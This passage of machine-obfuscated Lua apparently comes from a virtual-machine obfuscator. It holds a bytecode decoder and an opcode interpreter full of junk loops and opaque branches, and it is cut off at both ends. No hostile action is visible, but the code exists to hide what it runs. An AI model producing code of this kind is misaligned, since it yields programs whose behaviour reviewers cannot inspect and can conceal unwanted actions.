y,(bi and bh)),bi(y,bh,bi,bh),bi(bi and bh,(bh and bh),bf,bh),y(bh,bi,bf,bi))end,function(q,s,v,w)if cw>p then local p=cv while true do p=p+ct if p<cs then return w else break end end end cw=cw+ct cx=(cx*d)%c if((cx%b)>a)then local a=cv while true do a=a+ct if(a<cs)then return q(v(w,q,q,(s and v)),q(q,v,s,(s and q))and w(s,w,w,s),s(q,w,q,(v and q)),v(q,v,q,v)and q(s,v,q,(q and w)))else break end end else local a=cv while true do a=a+ct if not(a~=cs)then break else return s end end end return w end)return cx;end)());else ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if a==0 then b,c=cf(),cf()else if b==0 and c==0 then return 0;end;end else if 3>a then d=1 else p=(cd(c,1,20)*(2^32))+b end end else if a<=5 then if 5>a then q=cd(c,21,31)else s=((-1)^cd(c,32))end else if a<=6 then if(not(q~=0))then if((p==0))then return(s*0);else q=1;d=0;end;elseif(not(q~=2047))then if(p==0)then return s*(1/0);else return(s*((0/0)));end;end;else if 7==a then return(s*2^(q-1023)*(d+(p/(2^52))))else break end end end end a=a+1 end end end else if bd<=29 then cl="\46"else if bd==30 then cm=function()local a,b,c=0 while true do if a<=1 then if a==0 then b,c=h(bn,br,br+2)else b,c=bu(b,cb),bu(c,cb);end else if a<=2 then br=br+2;else if a<4 then return((bv(c,8))+b);else break end end end a=a+1 end end else cn=cf end end end else if bd<=33 then if 33>bd then co=function()local a,b,c,d,p=0 while true do if a<=2 then if a<=0 then b=g else if a>1 then d=0 else c=157 end end else if a<=3 then p={}else if a==4 then while(d<8)do d=(d+1);while d<707 and c%1622<811 do c=((c*35))local q=(d+c)if((c%16522)<8261)then c=((c*19))while(((d<828))and c%658<329)do c=((c+60))local q=d+c if(((c%18428))==9214 or((c%18428))<9214)then c=((c-50))local q=10701 if not p[q]then p[q]=1;local q,s=cn(),g;if not(not(q==0))then return g;end;b=j(bn,br,(br+q-1));br=((br+q));return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1==s then while true do if 0<v then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif(not((c%4)==0))then c=((c-67))local q=33140 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s==1 then while true do if v~=1 then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end else c=((c*88))d=(d+1)local q=92657 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if(1>v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=((d+1));end elseif not(c%4==0)then c=((c-48))while((d<859)and(c%1392<696))do c=(c*39)local q=((d+c))if((c%58)<29)then c=(((c+5)))local q=33930 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if s>1 then break else while true do if(v>0)then break else return i(h(q))end v=v+1 end end end s=s+1 end end);end elseif not(not(c%4~=0))then c=(c*56)local q=35370 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if v>0 then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end else c=((c*9))d=d+1 local q=96267 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2>s then while true do if not(1==v)then return i(h(q))else break end v=v+1 end else break end end s=s+1 end end);end end;d=(d+1);end else c=(((c-51)))d=(d+1)while(d<663)and((c%936)<468)do c=(((c*12)))local q=(d+c)if((c%18532)>=9266)then c=((c*71))local q=7037 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 2~=s then while true do if(v>0)then break else return i(h(q))end v=v+1 end else break end end s=s+1 end end);end elseif not(not((c%4)~=0))then c=(c-18)local q=90882 if not p[q]then p[q]=1;return z(b,cl,function(q)local s,v=0 while true do if s<=0 then v=0 else if 1<s then break else while true do if not(1==v)then return i(h(q))else break end v=(v+1)end end end s=s+1 end end);end else c=(c*35)d=(d+1)local q=41573 if not p[q]then p[q]=1;return z(b,cl,function(b)local p,q=0 while true do if p<=0 then q=0 else if p<2 then while true do if(q==0)then return i(h(b))else break end q=(q+1)end else break end end p=p+1 end end);end end;d=d+1;end end;d=d+1;end c=((c-494))if((d>43))then break;end;end;else break end end end a=a+1 end end else cp=cf end else if bd<=34 then cq=function(...)local a=0 while true do if a>0 then break else return{...},n("\35",...)end a=a+1 end end else if 35==bd then cr=function()local a,b,c,d,p,q,s,v,w,x=0 while true do if a<=9 then if a<=4 then if a<=1 then if a>0 then q=m({[ch]=b,nil,[ci]=c,nil,[776]=p,[345]=bb,[536]=nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return j(bn,br,br);end,})else b,c,d,p={},{},{},{}end else if a<=2 then s={}else if 3==a then v=490 else w=0 end end end else if a<=6 then if a==5 then x={}else while(w<3)do w=((w+1));while((w<481 and v%320<160))do v=(v*62)local d=(w+v)if(v%916)>458 then v=(((v-88)))while((w<318)and(v%702<351))do v=(((v*8)))local d=(w+v)if((v%14064)>7032)then v=((v*81))local d=58084 if not x[d]then x[d]=1;s[cf()]=nil;end elseif(v%4~=0)then v=((v*37))local d=93269 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+10))w=(w+1)local d=78058 if not x[d]then x[d]=1;for d=1,cf()do local j=cg();if(not(not(j==3)))then s[d]=nil;elseif(not(not(j==0)))then s[d]=(not(not(cg()~=0)));elseif((j==2))then s[d]=ck();elseif(not(not(j==1)))then s[d]=co();end;end;q[cj]=s;end end;w=w+1;end elseif not(((v%4)==0))then v=((v*65))while w<615 and v%618<309 do v=((v-33))local d=(w+v)if((((v%15582))>7791))then v=(((v*14)))local d=31092 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(not(v%4~=0))then v=((v+51))local d=68285 if not x[d]then x[d]=1;s[cf()]=nil;end else v=(((v+53)))w=(w+1)local d=64266 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=((w+1));end else v=(v+7)w=(w+1)while(w<127 and v%1548<774)do v=((v-37))local d=(w+v)if(((v%19188))>9594)then v=((v*61))local d=73351 if not x[d]then x[d]=1;s[cf()]=nil;end elseif not(v%4==0)then v=(v+25)local d=78934 if not x[d]then x[d]=1;s[cf()]=nil;end else v=((v+42))w=(w+1)local d=62692 if not x[d]then x[d]=1;s[cf()]=nil;end end;w=(w+1);end end;w=w+1;end v=(v*482)if w>56 then break;end;end;end else if a<=7 then v=414 else if a==8 then w=0 else x={}end end end end else if a<=14 then if a<=11 then if a==10 then while(w<5)do w=((w+1));while((w<956 and v%1292<646))do v=(v*55)local d=((w+v))if(((v%11904))>5952 or((v%11904))==5952)then v=((v+43))while((w<514)and((v%228)<114))do v=((v-50))local d=(w+v)if((v%15554))<7777 then v=((v-97))local d=10959 if not x[d]then x[d]=1;local d=1;local j=2;local p=3;local y=4;for y=1,cf()do local bb=cg();local be=cd(bb,d,d);if(not((not(be==0))))then local bb,be,bf=cd(bb,j,p),cd(bb,4,6),m({[878]=cm(),[654]=cm(),nil,nil},{['\95\95\116\111\115\116\114\105\110\103']=function(...)return cd(bb,j,p);end,})if(((bb==0)or(bb==d)))then bf[131]=cf();if(not(bb~=0))then bf[216]=cf();end;elseif((not(bb~=j))or(not(not(bb==p))))then bf[131]=((cf()-(e)));if(not(not(not(bb~=p))))then bf[216]=cm();end;end;if(((not(cd(be,d,d)~=d))))then bf[654]=s[bf[654]];end;if(not(not(cd(be,j,j)==d)))then bf[131]=s[bf[131]];end;if((not(cd(be,p,p)~=d)))then bf[216]=s[bf[216]];end;b[y]=bf;end;end;end elseif not(v%4==0)then v=(((v-76)))local b=814 if not x[b]then x[b]=1;end else v=((v-13))w=(w+1)local b=57166 if not x[b]then x[b]=1;end end;w=w+1;end elseif not(((v%4)==0))then v=(v*37)while(((w<324)and(v%606)<303))do v=((v*7))local b=((w+v))if((v%3384)==1692 or(v%3384)>1692)then v=(v-96)local b=59837 if not x[b]then x[b]=1;end elseif(not((v%4)==0))then v=((v+47))local b=38605 if not x[b]then x[b]=1;end else v=(((v-27)))w=(w+1)local b=64310 if not x[b]then x[b]=1;end end;w=((w+1));end else v=(((v+79)))w=(w+1)while(w<102 and v%862<431)do v=((v*9))local b=(w+v)if((v%11084))>5542 then v=((v+98))local b=44303 if not x[b]then x[b]=1;end elseif not(((v%4)==0))then v=(((v-57)))local b=5019 if not x[b]then x[b]=1;end else v=((v-16))w=w+1 local b=27810 if not x[b]then x[b]=1;end end;w=(w+1);end end;w=(w+1);end v=((v*672))if w>29 then break;end;end;else for b=1,cf()do c[b-1]=cr();end;end else if a<=12 then q[481]=cg();else if 14~=a then do for b=1,#q[ch]do local b=q[ch][b]local c,d,e=b[654],b[131],b[216]if not(not(bp(c)==f))then c=z(c,cl,function(j,p,p,p)local p,s=0 while true do if p<=0 then s=0 else if p>1 then break else while true do if(s<1)then return i(bu(h(j),cb))else break end s=s+1 end end end p=p+1 end end)b[654]=c end if not(not(bp(d)==f))then d=z(d,cl,function(c,j,j)local j,p=0 while true do if j<=0 then p=0 else if j==1 then while true do if not(1==p)then return i(bu(h(c),cb))else break end p=p+1 end else break end end j=j+1 end end)b[131]=d end if not(not((bp(e)==f)))then e=z(e,cl,function(c,d,d)local d,j=0 while true do if d<=0 then j=0 else if d==1 then while true do if j<1 then return i(bu(h(c),cb))else break end j=(j+1)end else break end end d=d+1 end end)b[216]=e end;end;q[cj]=nil;end;else v=15 end end end else if a<=16 then if 16~=a then w=0 else x={}end else if a<=17 then while(w<4)do w=(w+1);while w<669 and v%1920<960 do v=((v+81))local b=((w+v))if((v%11174)<5587)then v=((v*16))while(((w<883)and(v%1212<606)))do v=((v*54))local b=w+v if(((v%8548)<4274))then v=(v-22)local b=76284 if not x[b]then x[b]=1;end elseif not((v%4==0))then v=(((v+12)))local b=29664 if not x[b]then x[b]=1;return q end else v=((v*27))w=(w+1)local b=25030 if not x[b]then x[b]=1;q[536]=function(...)local b,c,d,e,h=0 while true do if b<=0 then c,d,e,h=0 else if 1==b then while true do if(c==2 or c<2)then if c<=0 then d=n(1,...)else if(2~=c)then e=({...})else do for d=0,#e do if not(not(bp(e[d])==bq))then for i,i in o,e[d]do if not(bp(i)~=bp(g))then t(bo,i)end end else t(bo,e[d])end end end end end else if(c<3 or c==3)then h=function(d)local i,j,p=0 while true do if i<=0 then j,p=0 else if 1<i then break else while true do if(j<1 or j==1)then if not(j~=0)then p=u(d)else for p=0,#bo do if ba(d,bo[p])then return bm(f);end end end else if j~=3 then return false else break end end j=j+1 end end end i=i+1 end end else if not(c~=4)then for d=0,#e do if not(bp(e[d])~=bq)then return h(e[d])end end else break end end end c=(c+1)end else break end end b=b+1 end end end end;w=(w+1);end elseif(not((v%4)==0))then v=(((v*6)))while(w<65 and v%484<242)do v=((v+74))local b=((w+v))if(((v%2158)<1079))then v=((v-45))local b=55196 if not x[b]then x[b]=1;return q end elseif not(not(((v%4))~=0))then v=(v*44)local b=62526 if not x[b]then x[b]=1;return q end else v=(((v+98)))w=(w+1)local b=37980 if not x[b]then x[b]=1;return q end end;w=(w+1);end else v=(v*56)w=((w+1))while(w<639 and(v%252<126))do v=(((v+55)))local b=w+v if(((v%9262))>4631 or((v%9262))==4631)then v=((v+22))local b=91496 if not x[b]then x[b]=1;return q end elseif not(v%4==0)then v=((v*82))local b=50550 if not x[b]then x[b]=1;return q end else v=(((v+55)))w=(w+1)local b=43134 if not x[b]then x[b]=1;return q end end;w=w+1;end end;w=((w+1));end v=(((v+70)))if((w>33))then break;end;end;else if 18<a then break else return q;end end end end end a=a+1 end end else break end end end end end end bd=bd+1 end local function a(b,c)local d if bp(l)==bq then d=l;else d=l(bl);end local e={}for f,h in o,d do if h~=b then e[f]=h else e[f]=c;end end if bc then return bc(bl,e)else l=e;return l;end end;local function b(...)local c=n(bl,...);local d=c[ci];local e=c[536];local f=c[ch];local h=n(2,...);local i=c[345];local j=n(3,...);local o=c[481];local c=c[776];local c=bt[ba(bx,i)];return function(...)local i,n,p,q,s,u,v,w=cq,1,-1,{},{...},(n("\35",...)-1),{},{};for x=0,u,1 do if(x>=o)then q[x-o]=s[x+1];else w[x]=s[x+1];end;end;local x,y,z,ba=(u-o+1),nil,nil,{};while true do y=f[n];z=y[878];if 186>=z then if z<=92 then if 45>=z then if(z==22 or z<22)then if(z==10 or z<10)then if(z==4 or z<4)then if(z==1 or z<1)then if not(z~=0)then local ba=y[654];local bb=w[ba];for bc=(ba+1),y[131]do t(bb,w[bc])end;else local ba=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 1~=ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba==2 then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if ba<=5 then if 5~=ba then n=n+1;else y=f[n];end else if 6<ba then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=11 then if ba<=9 then if 8==ba then y=f[n];else w[y[654]]=h[y[131]];end else if 11~=ba then n=n+1;else y=f[n];end end else if ba<=13 then if 12==ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba<=14 then y=f[n];else if 15<ba then break else if(w[y[654]]~=w[y[216]])then n=n+1;else n=y[131];end;end end end end end ba=ba+1 end end;elseif(2>z or 2==z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[654]]=w[y[131]][w[y[216]]];end else if 2==ba then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[654]]=w[y[131]];else n=n+1;end else if ba<=6 then y=f[n];else if ba~=8 then w[y[654]]=y[131];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[654]]=y[131];end else if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[654]]=y[131];end end end else if ba<=15 then if ba==14 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[654]else if ba>17 then break else w[bb]=w[bb](r(w,bb+1,y[131]))end end end end end ba=ba+1 end elseif not(z~=3)then local ba=y[654]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[216]do bc=bc+1;w[bd]=bb[bc];end else w[y[654]][y[131]]=y[216];end;elseif z<=7 then if(z==5 or z<5)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba>3 then n=n+1;else w[y[654]]=h[y[131]];end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[654]]=h[y[131]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 14~=ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[654]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif not(z~=6)then if(w[y[654]]~=y[216])then n=y[131];else n=n+1;end;else w[y[654]]=j[y[131]];end;elseif 8>=z then local ba=y[654]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[216]do bc=bc+1;w[bd]=bb[bc];end elseif(9<z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1>ba then bb=nil else w[y[654]]=j[y[131]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[654]]=y[131];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[654]]=y[131];end else if ba<=11 then n=n+1;else if 12<ba then w[y[654]]=y[131];else y=f[n];end end end else if ba<=15 then if ba==14 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[654]else if 18>ba then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=12 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2~=ba then w={};else for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;end end else if ba<=3 then n=n+1;else if 4<ba then w[y[654]]=h[y[131]];else y=f[n];end end end else if ba<=8 then if ba<=6 then n=n+1;else if ba==7 then y=f[n];else w[y[654]]=j[y[131]];end end else if ba<=10 then if 9==ba then n=n+1;else y=f[n];end else if 12>ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if ba<=18 then if ba<=15 then if ba<=13 then y=f[n];else if 15>ba then w[y[654]]=y[131];else n=n+1;end end else if ba<=16 then y=f[n];else if ba>17 then n=n+1;else w[y[654]]=y[131];end end end else if ba<=21 then if ba<=19 then y=f[n];else if ba==20 then w[y[654]]=y[131];else n=n+1;end end else if ba<=23 then if 22==ba then y=f[n];else bb=y[654]end else if ba~=25 then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end end ba=ba+1 end end;elseif(16==z or 16>z)then if z<=13 then if z<=11 then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[654]]=w[y[131]][y[216]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if ba<=6 then y=f[n];else if ba==7 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if ba<=11 then n=n+1;else if ba>12 then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end end else if ba<=15 then if 14==ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[654]else if ba~=18 then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif not(z~=12)then w[y[654]]=(y[131]*w[y[216]]);else local ba=y[654]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[216]do bc=(bc+1);w[bd]=bb[bc];end end;elseif(14>=z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 1~=ba then bb=nil else w[y[654]]=w[y[131]][y[216]];end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba<5 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[654]]=false;end end end else if ba<=15 then if 14<ba then y=f[n];else n=n+1;end else if ba<=16 then bb=y[654]else if 17<ba then break else w[bb](w[bb+1])end end end end end ba=ba+1 end elseif z<16 then local ba=y[654]local bb,bc=i(w[ba](r(w,ba+1,y[131])))p=(bc+ba-1)local bc=0;for bd=ba,p do bc=(bc+1);w[bd]=bb[bc];end;else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[654]]=w[y[131]][y[216]];else if 1<ba then y=f[n];else n=n+1;end end else if ba<=4 then if 3==ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba==5 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 8<ba then w[y[654]]=w[y[131]][y[216]];else y=f[n];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 13>ba then if w[y[654]]then n=n+1;else n=y[131];end;else break end end end end ba=ba+1 end end;elseif z<=19 then if(z==17 or z<17)then local ba=y[654];local bb=w[y[131]];w[ba+1]=bb;w[ba]=bb[w[y[216]]];elseif z<19 then if w[y[654]]then n=(n+1);else n=y[131];end;else local ba=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then n=n+1;else w[y[654]]=w[y[131]]/y[216];end else if ba<=2 then y=f[n];else if 3<ba then n=n+1;else w[y[654]]=w[y[131]]-w[y[216]];end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[654]]=w[y[131]]/y[216];end else if ba<=7 then n=n+1;else if 9~=ba then y=f[n];else w[y[654]]=w[y[131]]*y[216];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[654]]=w[y[131]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then w[y[654]]=w[y[131]];else n=n+1;end else if ba<=17 then y=f[n];else if 18==ba then n=y[131];else break end end end end end ba=ba+1 end end;elseif z<=20 then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[654]]=j[y[131]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if 7>ba then y=f[n];else w[y[654]]=h[y[131]];end end end else if ba<=11 then if ba<=9 then if 8<ba then y=f[n];else n=n+1;end else if ba<11 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[654]end else if 14<ba then break else w[bb]=w[bb](w[bb+1])end end end end ba=ba+1 end elseif(z~=22)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba==0 then bb=nil else w[y[654]]=w[y[131]][y[216]];end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 4<ba then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if ba<=6 then y=f[n];else if ba<8 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9<ba then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=15 then if ba<15 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[654]else if ba>17 then break else w[bb]=w[bb](w[bb+1])end end end end end ba=ba+1 end else local ba=y[654];p=ba+x-1;for bb=ba,p do local ba=q[(bb-ba)];w[bb]=ba;end;end;elseif(33>z or 33==z)then if 27>=z then if(z<24 or z==24)then if not(24==z)then w[y[654]]={};else w[y[654]]=y[131];end;elseif(z<=25)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0<ba then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[654]]=j[y[131]];else n=n+1;end end end else if ba<=6 then if 6~=ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[654]]=w[y[131]][y[216]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[654]end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif 26<z then if(w[y[654]]<w[y[216]]or w[y[654]]==w[y[216]])then n=(n+1);else n=y[131];end;else local ba=y[654]w[ba](r(w,(ba+1),p))end;elseif(z<=30)then if(z<=28)then local ba,bb=0 while true do if(ba==8 or ba<8)then if ba<=3 then if(ba==1 or ba<1)then if(1>ba)then bb=nil else w[y[654]]=w[y[131]][y[216]];end else if(ba<3)then n=(n+1);else y=f[n];end end else if(ba<=5)then if 5~=ba then w[y[654]]=w[y[131]][y[216]];else n=(n+1);end else if(ba==6 or ba<6)then y=f[n];else if(7<ba)then n=n+1;else w[y[654]]=w[y[131]][y[216]];end end end end else if(ba<13 or ba==13)then if ba<=10 then if 9<ba then w[y[654]]=w[y[131]][y[216]];else y=f[n];end else if(ba<11 or ba==11)then n=n+1;else if 13~=ba then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if(ba==15 or ba<15)then if not(ba~=14)then n=n+1;else y=f[n];end else if(ba<=16)then bb=y[654]else if ba>17 then break else w[bb]=w[bb](w[bb+1])end end end end end ba=(ba+1)end elseif(29<z)then local ba,bb,bc,bd,be,bf=0 while true do if ba<=3 then if ba<=1 then if(ba>0)then bc=y[216]else bb=y[654]end else if not(ba==3)then bd=bb+2 else be={w[bb](w[bb+1],w[bd])}end end else if ba<=5 then if not(ba==5)then for bg=1,bc do w[(bd+bg)]=be[bg];end else bf=w[bb+3]end else if(ba<7)then if bf then w[bd]=bf;n=y[131];else n=n+1 end;else break end end end ba=(ba+1)end else local ba,bb,bc,bd=0 while true do if(ba<=9)then if(ba==4 or ba<4)then if(ba==1 or ba<1)then if ba<1 then bb=nil else bc=nil end else if(ba<=2)then bd=nil else if ba==3 then w[y[654]]=h[y[131]];else n=n+1;end end end else if(ba==6 or ba<6)then if ba<6 then y=f[n];else w[y[654]]=h[y[131]];end else if(ba<7 or ba==7)then n=n+1;else if not(9==ba)then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if(ba<14 or ba==14)then if ba<=11 then if not(ba==11)then n=(n+1);else y=f[n];end else if(ba==12 or ba<12)then w[y[654]]=w[y[131]][w[y[216]]];else if not(14==ba)then n=(n+1);else y=f[n];end end end else if(ba<=16)then if(ba<16)then bd=y[654]else bc={w[bd](w[bd+1])};end else if(ba<17 or ba==17)then bb=0;else if ba>18 then break else for be=bd,y[216]do bb=(bb+1);w[be]=bc[bb];end end end end end end ba=ba+1 end end;elseif(31==z or 31>z)then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if ba==1 then w[y[654]]=w[y[131]][y[216]];else n=n+1;end end else if ba<=4 then if ba==3 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if 7<ba then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if ba>9 then w[y[654]]=w[y[131]]*y[216];else y=f[n];end end else if ba<=12 then if 12>ba then n=n+1;else y=f[n];end else if 14~=ba then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if 15<ba then w[y[654]]=j[y[131]];else y=f[n];end else if 17==ba then n=n+1;else y=f[n];end end else if ba<=20 then if 19<ba then n=n+1;else w[y[654]]=w[y[131]][y[216]];end else if ba~=22 then y=f[n];else w[y[654]]=w[y[131]];end end end else if ba<=26 then if ba<=24 then if 23<ba then y=f[n];else n=n+1;end else if ba<26 then w[y[654]]=w[y[131]]+w[y[216]];else n=n+1;end end else if ba<=28 then if 27==ba then y=f[n];else bb=y[654]end else if ba==29 then w[bb]=w[bb](r(w,bb+1,y[131]))else break end end end end end ba=ba+1 end elseif z>32 then local ba=y[654];local bb=w[y[131]];w[ba+1]=bb;w[ba]=bb[y[216]];else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[654]][y[131]]=w[y[216]];else bb=nil end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[654]]={};else n=n+1;end else if ba<7 then y=f[n];else w[y[654]][y[131]]=y[216];end end end else if ba<=11 then if ba<=9 then if ba<9 then n=n+1;else y=f[n];end else if 11>ba then w[y[654]][y[131]]=w[y[216]];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[654]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[131]))end end end end ba=ba+1 end end;elseif(39>z or 39==z)then if(z<=36)then if 34>=z then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[654]]=h[y[131]];end end end else if ba<=6 then if 5<ba then w[y[654]]=h[y[131]];else y=f[n];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[654]end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z>35 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[654]]=h[y[131]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[654]]=h[y[131]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end end else if ba<=14 then if ba<=11 then if ba>10 then y=f[n];else n=n+1;end else if ba<=12 then w[y[654]]=w[y[131]][w[y[216]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[654]end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[216]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end else local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[654]]=w[y[131]][y[216]];else if ba>1 then y=f[n];else n=n+1;end end else if ba<=4 then if 4~=ba then w[y[654]]=w[y[131]][y[216]];else n=n+1;end else if ba~=6 then y=f[n];else w[y[654]]=w[y[131]][y[216]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[654]][y[131]]=w[y[216]];end end else if ba<=11 